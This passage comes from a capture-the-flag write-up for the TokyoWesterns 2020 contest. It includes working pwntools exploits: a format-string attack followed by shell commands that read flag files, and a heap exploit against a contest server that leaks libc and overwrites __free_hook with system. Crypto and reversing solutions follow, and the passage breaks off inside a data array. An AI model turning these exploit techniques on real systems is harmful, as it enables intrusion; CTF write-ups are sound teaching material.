+      fmt = <span class="hljs-string">"%c%c%c%"</span> + <span class="hljs-built_in">str</span>(stack<span class="hljs-number">-3</span>) + <span class="hljs-string">"c%hn"</span> + <span class="hljs-string">"%c"</span>*<span class="hljs-number">9</span> + <span class="hljs-string">"%"</span> + <span class="hljs-built_in">str</span>(offset-stack<span class="hljs-number">-9</span>) +<span class="hljs-string">"c"</span> + <span class="hljs-string">"%*d"</span> + <span class="hljs-string">"%48$n"</span>
+      fmt = fmt.ljust(<span class="hljs-number">200</span>,<span class="hljs-string">"\x00"</span>)
+      r.sendline(fmt)
+      <span class="hljs-built_in">print</span>(<span class="hljs-string">"send"</span>)
+      r.sendline(<span class="hljs-string">"echo AAAAAAA"</span>)
+      r.sendline(<span class="hljs-string">"echo AAAAAAA"</span>)
+      r.sendline(<span class="hljs-string">"echo AAAAAAA"</span>)
+      r.sendline(<span class="hljs-string">"ls"</span>)
+      r.sendline(<span class="hljs-string">"pwd"</span>)
+      r.sendline(<span class="hljs-string">"cat f*"</span>)
+      r.sendline(<span class="hljs-string">"cat /f*"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/*/flag"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/blindshot/flag"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/blindshot/f*"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/blindshot/flag.txt"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/*/flag.txt"</span>)
+      r.sendline(<span class="hljs-string">"cat /home/*/f*"</span>)
+      r.sendline(<span class="hljs-string">"cat flag.txt"</span>)
+      r.sendline(<span class="hljs-string">"cat flag"</span>)
+      r.sendline(<span class="hljs-string">"cat f*"</span>)
+      r.recvuntil(<span class="hljs-string">"AAAAAAA"</span>)
+      r.interactive()
+    except:
+      r.close()
+      <span class="hljs-keyword">continue</span>
+</code></pre><h3 id="online-nonogram"><a class="header-link" href="#online-nonogram"></a>Online Nonogram</h3>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> random
+host = <span class="hljs-string">'pwn03.chal.ctf.westerns.tokyo'</span>
+port = <span class="hljs-number">22915</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment">#r = process('./nono')</span>
+r = remote(host,port)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(title,size,content)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"2"</span>)
+    r.sendlineafter(<span class="hljs-string">":"</span>,title)
+    r.sendlineafter(<span class="hljs-string">":"</span>,str(size))
+    r.sendafter(<span class="hljs-string">":"</span>,content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span><span class="hljs-params">(idx)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"1"</span>)
+    r.sendlineafter(<span class="hljs-string">":"</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span>
+    r.recvuntil(<span class="hljs-string">": "</span>)
+    r.sendline(<span class="hljs-string">"3"</span>)
+    r.recvuntil(<span class="hljs-string">"x:\n"</span>)
+    r.sendline(str(idx))
+
+add(<span class="hljs-string">"a"</span>,<span class="hljs-number">91</span>,<span class="hljs-string">"\x00"</span>)
+play(<span class="hljs-number">2</span>)
+r.recvuntil(<span class="hljs-string">"Row's Numbers"</span>)
+r.recvline()
+
+data = [ r.recvline() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">91</span>)]
+leak = data[<span class="hljs-number">2</span>:]
+heap = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-string">b"1"</span> <span class="hljs-keyword">in</span> leak[i]:
+        heap |= (<span class="hljs-number">1</span>&lt;&lt;i)
+
+print(hex(heap))
+
+
+heapbase = heap - <span class="hljs-number">0x11f90</span>
+print(<span class="hljs-string">"heapbase = {}"</span>.format(hex(heapbase)))
+r.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"92 92"</span>)
+r.recvuntil(<span class="hljs-string">"y: "</span>)
+
+remove(<span class="hljs-number">2</span>)
+payload = p64(heap + <span class="hljs-number">0x80</span> + <span class="hljs-number">0x4b0</span>) + p64(heap + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x4b0</span>)
+payload = payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b"\x00"</span>)
+payload += p64(<span class="hljs-number">0x10</span>) + p64(heap) + p64(heap+<span class="hljs-number">0x60</span>) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b"A"</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>)
+payload = payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b"\x00"</span>) + p64(<span class="hljs-number">0x41</span>)
+payload += p64(<span class="hljs-number">0x10</span>) + p64(heapbase + <span class="hljs-number">0x10</span>) + p64(heapbase+<span class="hljs-number">0x11ef0</span>) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b"A"</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">6</span>
+payload = payload.ljust(<span class="hljs-number">1024</span>,<span class="hljs-string">b"\x00"</span>)
+add(<span class="hljs-string">"a"</span>,<span class="hljs-number">-123</span>,payload + p64(heap + <span class="hljs-number">0x4b0</span>) + p64(heap + <span class="hljs-number">0x4c0</span>) + p64(heap + <span class="hljs-number">0x4d0</span>))
+
+r.recvuntil(<span class="hljs-string">": "</span>)
+r.sendline(<span class="hljs-string">"4"</span>)
+r.recvuntil(<span class="hljs-string">"0 : "</span>)
+libc = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b"\x00"</span>)) - <span class="hljs-number">0x1ebfd0</span>
+print(<span class="hljs-string">"libc = {}"</span>.format(hex(libc)))
+r.recvuntil(<span class="hljs-string">"dex:\n"</span>)
+r.sendline(<span class="hljs-string">"4"</span>)
+remove(<span class="hljs-number">1</span>)
+free_hook = libc + <span class="hljs-number">0x1eeb28</span>
+payload = <span class="hljs-string">b"th"</span> + <span class="hljs-string">b"\x00"</span>*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span> + p64(free_hook)
+payload = payload.ljust(<span class="hljs-number">0x280</span>,<span class="hljs-string">b"\x00"</span>)
+
+system = libc + <span class="hljs-number">0x55410</span>
+input(<span class="hljs-string">"@"</span>)
+add(payload,<span class="hljs-number">8</span>,p64(system))
+
+r.interactive()</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="easy-hash"><a class="header-link" href="#easy-hash"></a>easy-hash</h3>
+<p>The hash function combine the hash of the blocks and is commutative, simply swap two of the blocks.</p>
+<h3 id="twin-d"><a class="header-link" href="#twin-d"></a>Twin-d</h3>
+<p><code>2*e1*e2-e2-e1</code> will be multiple of <code>phi</code></p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse
+
+n = <span class="hljs-number">26524843197458127443771133945229625523754949369487014791599807627467226519111599787153382777120140612738257288082433176299499326592447109018282964262146097640978728687735075346441171264146957020277385391199481846763287915008056667746576399729177879290302450987806685085618443327429255304452228199990620148364422757098951306559334815707120477401429317136913170569164607984049390008219435634838332608692894777468452421086790570305857094650986635845598625452629832435775350210325954240744747531362581445612743502972321327204242178398155653455971801057422863549217930378414742792722104721392516098829240589964116113253433</span>
+e1 = <span class="hljs-number">3288342258818750594497789899280507988608009422632301901890863784763217616490701057613228052043090509927547686042501854377982072935093691324981837282735741669355268200192971934847782966333731663681875702538275775308496023428187962287009210326890218776373213535570853144732649365499644400757341574136352057674421661851071361132160580465606353235714126225246121979148071634839325793257419779891687075215244608092289326285092057290933330050466351755345025419017436852718353794641136454223794422184912845557812856838827270018279670751739019476000437382608054677808858153944204833144150494295177481906551158333784518167127</span>
+e2 = <span class="hljs-number">20586777123945902753490294897129768995688830255152547498458791228840609956344138109339907853963357359541404633422300744201016345576195555604505930482179414108021094847896856094422857747050686108352530347664803839802347635174893144994932647157839626260092064101372096750666679214484068961156588820385019879979501182685765627312099064118600537936317964839371569513285434610671748047822599856396277714859626710571781608350664514470335146001120348208741966215074474578729244549563565178792603028804198318917007000826819363089407804185394528341886863297204719881851691620496202698379571497376834290321022681400643083508905</span>
+enc = <span class="hljs-number">18719581313246346528221007858250620803088488607301313701590826442983941607809029805859628525891876064099979252513624998960822412974893002313208591462294684272954861105670518560956910898293761859372361017063600846481279095019009757152999533708737044666388054242961589273716178835651726686400826461459109341300219348927332096859088013848939302909121485953178179602997183289130409653008932258951903333059085283520324025705948839786487207249399025027249604682539137261225462015608695527914414053262360726764369412756336163681981689249905722741130346915738453436534240104046172205962351316149136700091558138836774987886046</span>
+
+xphi = <span class="hljs-number">2</span>*e1*e2+e2-e1
+d = inverse(e1,xphi)
+M = pow(enc,d,n)
+print(long_to_bytes(M))</code></pre><h3 id="melancholy-alice"><a class="header-link" href="#melancholy-alice"></a>Melancholy Alice</h3>
+<p>strong prime does not guarantee unfactorable <code>(p-1)/2</code>. thus it is possible to construct multiple base with different orders, and calculate corresponding charset, then take intersection of those charsets to get flag.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse
+
+p = <span class="hljs-number">168144747387516592781620466787069575171940752179672411574452734808497653671359884981272746489813635225263167370526619987842319278446075098036112998679570069486935297242638675590736039429506131690941660748942375274820626186241210376537247501823653926524570571499198040207829317830442983944747691656715907048411</span>
+q = <span class="hljs-number">84072373693758296390810233393534787585970376089836205787226367404248826835679942490636373244906817612631583685263309993921159639223037549018056499339785034743467648621319337795368019714753065845470830374471187637410313093120605188268623750911826963262285285749599020103914658915221491972373845828357953524205</span>
+g = <span class="hljs-number">2</span>
+h = <span class="hljs-number">98640592922797107093071054876006959817165651265269454302952482363998333376245900760045606011965672215605936345612030149799453733708430421685495677502147392514542499678987737269487279698863617849581626352877756515435930907093553607392143564985566046429416461073375036461770604488387110385404233515192951025299</span>
+
+<span class="hljs-string">'''
+idea : 
+    c2* h * c1 * 2 = m * 2^(xr) * 2^x * 2^r * 2
+                   = m * 2^(xr+x+r+1)
+                   = m * 2^((x+1)(r+1))
+                   = m * (2h)^(r+1)
+                   = m * 2h^(95*T + R)
+
+    (m * 2h^(95T+R))^(q//3//5//19) = m^(q//3//5//19) * 2h^((95T+R)(q//3//5//19))
+                                   = UNK * 2h^((95T)(q//3//5//19)) * 2h^(R(q//3//5//19))
+                                   = UNK * 2h^(R(q//3//5//19))
+
+
+q*pow(2,1) -&gt; q/3 | 95
+q*pow(2,3) -&gt; q/5 | 57
+q*pow(2,15) -&gt; q/19 | 15
+
+'''</span>
+
+CF = open(<span class="hljs-string">'ciphertext.txt'</span>).read().strip().split(<span class="hljs-string">'\n'</span>)
+C = []
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> CF:
+    C.append(list(map(int,i[<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>].split(<span class="hljs-string">', '</span>))))
+
+BASE = [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>]
+ORD = [<span class="hljs-number">95</span>,<span class="hljs-number">57</span>,<span class="hljs-number">15</span>]
+
+VAL = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>)]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7f</span>):
+    VAL.append(pow(i,q//<span class="hljs-number">3</span>//<span class="hljs-number">5</span>//<span class="hljs-number">19</span>,p))
+
+COMBINED = []
+
+<span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
+    STATE = []
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(ORD):
+        STATE.append(pow(h*pow(<span class="hljs-number">2</span>,BASE[f],p),i*q//<span class="hljs-number">3</span>//<span class="hljs-number">5</span>//<span class="hljs-number">19</span>,p))
+
+
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> C:
+        STATE.append(<span class="hljs-string">''</span>)
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7f</span>):
+            target = pow(c[<span class="hljs-number">1</span>]*h*pow(c[<span class="hljs-number">0</span>],BASE[f],p)*pow(<span class="hljs-number">2</span>,BASE[f],p)%p,q//<span class="hljs-number">3</span>//<span class="hljs-number">5</span>//<span class="hljs-number">19</span>,p)
+            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(ORD):
+                <span class="hljs-keyword">if</span> (VAL[i]*STATE[j])%p==target:
+                    STATE[<span class="hljs-number">-1</span>]+=chr[i]
+    COMBINED.append(STATE)
+
+FINAL = [<span class="hljs-string">''</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(idx)]
+<span class="hljs-keyword">for</span> idx,cand <span class="hljs-keyword">in</span> enumerate(COMBINED[<span class="hljs-number">2</span>]):
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cand:
+        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> COMBINED[<span class="hljs-number">0</span>][idx] <span class="hljs-keyword">and</span> c <span class="hljs-keyword">in</span> COMBINED[<span class="hljs-number">1</span>][idx]:
+            FINAL[idx]+=c
+print(FINAL)</code></pre><h3 id="xor-and-shift-encryptor"><a class="header-link" href="#xor-and-shift-encryptor"></a>XOR and shift encryptor</h3>
+<h4 id="tl;dr"><a class="header-link" href="#tl;dr"></a>TL;DR</h4>
+<ol class="list">
+<li>Build the state transition function is 4096 x 4096 $GF(2)$ Matrix.</li>
+<li>Use double type for better matrix multiplication algorithm.</li>
+</ol>
+<p>Full writeup is at <a href="https://sasdf.github.io/ctf/writeup/2020/tokyoWesterns/crypto/xs/">here</a></p>
+<h4 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h4>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> trange, tqdm
+
+
+a, b, c = <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">37</span>
+m = (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span>)<span class="hljs-number">-1</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">()</span>:</span>
+    state = np.arange(<span class="hljs-number">64</span>, dtype=np.uint64)
+    state = np.frombuffer(state.tobytes(), dtype=np.uint8)
+    state = np.unpackbits(state, bitorder=<span class="hljs-string">'little'</span>)
+    <span class="hljs-keyword">return</span> state
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift_mat</span><span class="hljs-params">(n, s)</span>:</span>
+    <span class="hljs-keyword">return</span> np.diag(np.ones(n - abs(s), dtype=np.uint8), k=s)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">identity</span><span class="hljs-params">(*args)</span>:</span>
+    <span class="hljs-keyword">if</span> len(args) == <span class="hljs-number">1</span>: args = args[<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">return</span> np.eye(args, dtype=np.uint8)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">zeros</span><span class="hljs-params">(*args)</span>:</span>
+    <span class="hljs-keyword">if</span> len(args) == <span class="hljs-number">1</span>: args = args[<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">return</span> np.zeros(args, dtype=np.uint8)
+
+O = zeros(<span class="hljs-number">64</span>)
+I = identity(<span class="hljs-number">64</span>)
+A = shift_mat(<span class="hljs-number">64</span>, -a)
+B = shift_mat(<span class="hljs-number">64</span>, b)
+C = shift_mat(<span class="hljs-number">64</span>, c)
+S1 = ((B+I) @ (A+I)) &amp; <span class="hljs-number">1</span>
+S0 = (C+I) &amp; <span class="hljs-number">1</span>
+
+M = np.block([
+    [S0, S1, zeros(<span class="hljs-number">64</span>, <span class="hljs-number">4096</span><span class="hljs-number">-128</span>)],
+    [zeros(<span class="hljs-number">4096</span><span class="hljs-number">-128</span>, <span class="hljs-number">128</span>), identity(<span class="hljs-number">4096</span><span class="hljs-number">-128</span>)],
+    [I, zeros(<span class="hljs-number">64</span>, <span class="hljs-number">4096</span><span class="hljs-number">-64</span>)],
+])
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">matmul</span><span class="hljs-params">(A, B)</span>:</span>
+    A = (A &amp; <span class="hljs-number">1</span>).astype(np.double)
+    B = (B &amp; <span class="hljs-number">1</span>).astype(np.double)
+    C = (A @ B).astype(np.uint64) &amp; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> C
+
+
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">True</span>:
+    E = np.load(<span class="hljs-string">'cache.npy'</span>)
+<span class="hljs-keyword">else</span>:
+    E = [M]
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> trange(<span class="hljs-number">64</span>):
+        E.append(matmul(E[<span class="hljs-number">-1</span>], E[<span class="hljs-number">-1</span>]))
+    E = np.stack(E)
+    np.save(<span class="hljs-string">'cache.npy'</span>, E)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jump</span><span class="hljs-params">(n, state)</span>:</span>
+    R = identity(<span class="hljs-number">4096</span>)
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
+        <span class="hljs-keyword">if</span> (n &gt;&gt; s) &amp; <span class="hljs-number">1</span>:
+            state = matmul(E[s], state)
+    <span class="hljs-keyword">return</span> state
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randgen</span><span class="hljs-params">(state)</span>:</span>
+    s = np.packbits(state, bitorder=<span class="hljs-string">'little'</span>).tobytes()
+    s = np.frombuffer(s, dtype=np.uint64).tolist()
+    res = (s[<span class="hljs-number">0</span>] + s[<span class="hljs-number">1</span>]) &amp; m
+    state = matmul(M, state)
+    <span class="hljs-keyword">return</span> state, res
+
+
+state = init()
+state = jump(<span class="hljs-number">31337</span>, state)
+
+enc = open(<span class="hljs-string">"enc.dat"</span>, <span class="hljs-string">'rb'</span>).read()
+<span class="hljs-keyword">assert</span> len(enc) == <span class="hljs-number">256</span>
+
+flag = <span class="hljs-string">b""</span>
+
+bar = trange(len(enc))
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bar:
+    state, buf = randgen(state)
+    sh = x//<span class="hljs-number">2</span>
+    <span class="hljs-keyword">if</span> sh &gt; <span class="hljs-number">64</span>:sh = <span class="hljs-number">64</span>
+    mask = (<span class="hljs-number">1</span> &lt;&lt; sh) - <span class="hljs-number">1</span>
+    buf &amp;= mask
+    state = jump(buf, state)
+    state, r = randgen(state)
+    flag += bytes([ enc[x] ^ (r &amp; <span class="hljs-number">0xff</span>) ])
+    tqdm.write(repr(flag))
+bar.close()
+print(flag)</code></pre><h3 id="sqrt"><a class="header-link" href="#sqrt"></a>sqrt</h3>
+<p>Search through all 2^30 possible values.</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> gmpy2
+<span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp
+<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm, trange
+
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'output.txt'</span>) <span class="hljs-keyword">as</span> f:
+    c = int(f.readline())
+    p = int(f.readline())
+
+
+<span class="hljs-keyword">assert</span> (p - <span class="hljs-number">1</span>) % (<span class="hljs-number">2</span>**<span class="hljs-number">30</span>) == <span class="hljs-number">0</span>
+u = (p - <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">30</span>
+
+<span class="hljs-keyword">assert</span> pow(c, u, p) == <span class="hljs-number">1</span>
+
+m = pow(c, int(gmpy2.invert(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>, u)), p)
+<span class="hljs-keyword">assert</span> pow(m, u, p) == <span class="hljs-number">1</span>
+<span class="hljs-keyword">assert</span> pow(m, <span class="hljs-number">2</span>**<span class="hljs-number">64</span>, p) == c
+
+
+g = pow(<span class="hljs-number">3</span>, u, p)
+<span class="hljs-keyword">assert</span> g != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> g != p<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> pow(g, <span class="hljs-number">2</span>**<span class="hljs-number">30</span>, p) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> pow(g, <span class="hljs-number">2</span>**<span class="hljs-number">29</span>, p) != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> pow(g, <span class="hljs-number">2</span>**<span class="hljs-number">28</span>, p) != <span class="hljs-number">1</span>
+<span class="hljs-keyword">assert</span> pow(m*g, <span class="hljs-number">2</span>**<span class="hljs-number">64</span>, p) == c
+
+nworkers = <span class="hljs-number">32</span>
+chunksize = <span class="hljs-number">2</span>**<span class="hljs-number">30</span> // nworkers + <span class="hljs-number">1</span>
+
+progress = mp.Queue()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">worker</span><span class="hljs-params">(m)</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, chunksize, <span class="hljs-number">10000</span>):
+        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(i, min(chunksize, i+<span class="hljs-number">10000</span>)):
+            m = m * g % p
+            <span class="hljs-keyword">if</span> m.bit_length() &lt;= <span class="hljs-number">43</span> * <span class="hljs-number">8</span>:
+                print(m.to_bytes(<span class="hljs-number">43</span>, <span class="hljs-string">'big'</span>))
+        progress.put(<span class="hljs-number">10000</span>)
+
+z = pow(g, chunksize, p)
+procs = [mp.Process(target=worker, args=(m * pow(z, i, p) % p,)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(nworkers)]
+<span class="hljs-keyword">for</span> proc <span class="hljs-keyword">in</span> procs:
+    proc.start()
+bar = tqdm(total=<span class="hljs-number">2</span>**<span class="hljs-number">30</span>, smoothing=<span class="hljs-number">0</span>)
+<span class="hljs-keyword">try</span>:
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        bar.update(progress.get())
+<span class="hljs-keyword">finally</span>:
+    bar.close()
+    <span class="hljs-keyword">for</span> proc <span class="hljs-keyword">in</span> procs:
+        proc.terminate()
+        proc.join()</code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="reversing-is-amazing"><a class="header-link" href="#reversing-is-amazing"></a>Reversing iS Amazing</h3>
+<ol class="list">
+<li>It uses <code>RSA_private_encrypt</code> to encrypt the flag</li>
+<li>We can easily dump the private key.</li>
+<li>Now we have <code>n</code> <code>e</code> <code>d</code></li>
+<li><code>RSA_private_encrypt</code> =&gt; encflag = pow(flag,d,n) =&gt; flag = pow(encflag,e,n)</li>
+<li>flag = <code>TWCTF{Rivest_Shamir_Adleman}</code></li>
+</ol>
+<h3 id="tamarin"><a class="header-link" href="#tamarin"></a>Tamarin</h3>
+<ol class="list">
+<li>I use <a href="https://github.com/tjg1/mono_unbundle">mono_unbundle</a> to extract dlls from <code>armeabi-v7a/libmonodroid_bundle_app.so</code></li>
+<li><code>Tamarin.dll</code> is our target. Use <code>dnspy</code> to decompile it</li>
+<li>Write a z3 script to get the flag</li>
+</ol>
+<pre class="hljs"><code>from z3 import *
+
+aaa = [[
+                <span class="hljs-number">2921822136</span>,
+                <span class="hljs-number">1060277104</span>,
+                <span class="hljs-number">2035740900</span>,
+                <span class="hljs-number">823622198</span>,
+                <span class="hljs-number">210968592</span>,
+                <span class="hljs-number">3474619224</span>,
+                <span class="hljs-number">3252966626</span>,
+                <span class="hljs-number">1671622480</span>,
+                <span class="hljs-number">1174723606</span>,
+                <span class="hljs-number">3830387194</span>,
+                <span class="hljs-number">2514889364</span>,
+                <span class="hljs-number">3125636774</span>,
+                <span class="hljs-number">896423784</span>,
+                <span class="hljs-number">4164953836</span>,
+                <span class="hljs-number">2838119626</span>,
+                <span class="hljs-number">2523117444</span>,
+                <span class="hljs-number">1385864710</span>,
+                <span class="hljs-number">3157438448</span>,
+                <span class="hljs-number">132542958</span>,
+                <span class="hljs-number">4108218268</span>,
+                <span class="hljs-number">314662132</span>,
+                <span class="hljs-number">432653936</span>,
+                <span class="hljs-number">1147047258</span>,
+                <span class="hljs-number">1802950730</span>,
+                <span class="hljs-number">67411056</span>,
+                <span class="hljs-number">1207641174</span>,
+                <span class="hljs-number">1920298940</span>,
+                <span class="hljs-number">2947533900</span>,
+                <span class="hljs-number">3468512014</span>,
+                <span class="hljs-number">3485949926</span>,
+                <span class="hljs-number">3695085832</span>,
+                <span class="hljs-number">3903653528</span>
+            ],
+            [
+                <span class="hljs-number">463101660</span>,
+                <span class="hljs-number">3469888460</span>,
+                <span class="hljs-number">2006842986</span>,
+                <span class="hljs-number">144738028</span>,
+                <span class="hljs-number">630007230</span>,
+                <span class="hljs-number">3440652086</span>,
+                <span class="hljs-number">2322916652</span>,
+                <span class="hljs-number">2227002010</span>,
+                <span class="hljs-number">1163469256</span>,
+                <span class="hljs-number">23859328</span>,
+                <span class="hljs-number">2322597530</span>,
+                <span class="hljs-number">3716255122</span>,
+                <span class="hljs-number">2876706098</span>,
+                <span class="hljs-number">713374856</span>,
+                <span class="hljs-number">2345958624</span>,
+                <span class="hljs-number">3496771192</span>,
+                <span class="hljs-number">1773957550</span>,
+                <span class="hljs-number">146382778</span>,
+                <span class="hljs-number">1141367704</span>,
+                <span class="hljs-number">1061893394</span>,
+                <span class="hljs-number">994321632</span>,
+                <span class="hljs-number">3407332344</span>,
+                <span class="hljs-number">2240786438</span>,
+                <span class="hljs-number">2218631702</span>,
+                <span class="hljs-number">2906647610</span>,
+                <span class="hljs-number">1919308420</span>,
+                <span class="hljs-number">2136654012</span>,
+                <span class="hljs-number">164975906</span>,
+                <span class="hljs-number">2834189362</span>,
+                <span class="hljs-number">3118478912</span>,
+                <span class="hljs-number">3258673870</span>,
+                <span class="hljs-number">3211411825</span>
+            ],
+            [
+                <span class="hljs-number">2558729100</span>,
+                <span class="hljs-number">1170420958</span>,
+                <span class="hljs-number">2355877954</span>,
+                <span class="hljs-number">3593652986</span>,
+                <span class="hljs-number">2587766164</span>,
+                <span class="hljs-number">2271696650</span>,
+                <span class="hljs-number">1560549496</span>,
+                <span class="hljs-number">132089692</span>,
+                <span class="hljs-number">2893757564</span>,
+                <span class="hljs-number">3469624876</span>,
+                <span class="hljs-number">10109206</span>,
+                <span class="hljs-number">2948199026</span>,
+                <span class="hljs-number">4170042296</span>,
+                <span class="hljs-number">2717317064</span>,
+                <span class="hljs-number">4210960804</span>,
+                <span class="hljs-number">93756380</span>,
+                <span class="hljs-number">2006217436</span>,
+                <span class="hljs-number">2988057920</span>,
+                <span class="hljs-number">2251383150</span>,
+                <span class="hljs-number">226355976</span>,
+                <span class="hljs-number">579516546</span>,
+                <span class="hljs-number">3915017586</span>,
+                <span class="hljs-number">1273838010</span>,
+                <span class="hljs-number">2852178952</span>,
+                <span class="hljs-number">4272774672</span>,
+                <span class="hljs-number">1006507228</span>,
+                <span class="hljs-number">3595131622</span>,
+                <span class="hljs-number">1880597220</span>,
+                <span class="hljs-number">1230996622</span>,
+                <span class="hljs-number">2542910224</span>,
+                <span class="hljs-number">917668128</span>,
+                <span class="hljs-number">1612363977</span>
+            ],
+            [
+                <span class="hljs-number">3637139654</span>,
+                <span class="hljs-number">2593663532</span>,
+                <span class="hljs-number">649194106</span>,
+                <span class="hljs-number">4275630476</span>,
+                <span class="hljs-number">2730487128</span>,
+                <span class="hljs-number">905133820</span>,
+                <span class="hljs-number">2868808700</span>,
+                <span class="hljs-number">1284610026</span>,
+                <span class="hljs-number">1051455306</span>,
+                <span class="hljs-number">272375560</span>,
+                <span class="hljs-number">1219428572</span>,
+                <span class="hljs-number">163965224</span>,
+                <span class="hljs-number">3899483864</span>,
+                <span class="hljs-number">309833108</span>,
+                <span class="hljs-number">1862243284</span>,
+                <span class="hljs-number">1919038730</span>,
+                <span class="hljs-number">3414916994</span>,
+                <span class="hljs-number">3134382762</span>,
+                <span class="hljs-number">2018925234</span>,
+                <span class="hljs-number">3467081876</span>,
+                <span class="hljs-number">4045123308</span>,
+                <span class="hljs-number">4244105094</span>,
+                <span class="hljs-number">4205568254</span>,
+                <span class="hljs-number">1793827648</span>,
+                <span class="hljs-number">257732384</span>,
+                <span class="hljs-number">2092183712</span>,
+                <span class="hljs-number">3517540150</span>,
+                <span class="hljs-number">2641565070</span>,
+                <span class="hljs-number">2181538960</span>,
+                <span class="hljs-number">2670634300</span>,
+                <span class="hljs-number">2070334778</span>,
+                <span class="hljs-number">1995308868</span>
+            ],
+            [
+                <span class="hljs-number">561434200</span>,
